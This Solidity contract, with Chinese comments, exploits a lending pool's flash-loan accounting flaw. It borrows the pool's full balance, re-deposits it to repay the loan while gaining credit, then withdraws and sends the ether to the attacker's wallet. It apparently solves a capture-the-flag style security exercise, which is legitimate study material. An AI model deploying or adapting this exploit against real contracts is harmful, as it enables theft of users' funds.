// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ILenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract SideEntranceAttacker {
    address immutable attacker;
    ILenderPool immutable pool;

    constructor(address _poolAddress) {
        attacker = msg.sender;
        pool = ILenderPool(_poolAddress);
    }

    //利用deposit存入借出的錢 借此修改msg.sender的餘額後還款
    //接著withdraw剛存入的錢
    function attack() external {
        pool.flashLoan(address(pool).balance);//閃電貸出池子所有餘額
        pool.withdraw();//完成閃電貸後馬上提領
    }
    //deposit借出的錢到pool 
    //通過require(address(this).balance >= balanceBefore)        
    function execute() external payable {
        pool.deposit{value: msg.value}();
    }
    //receive()用來接收attack()的withdraw
    //並從攻擊合約轉到attacker錢包
    receive() external payable {
        payable(attacker).send(address(this).balance);
    }

}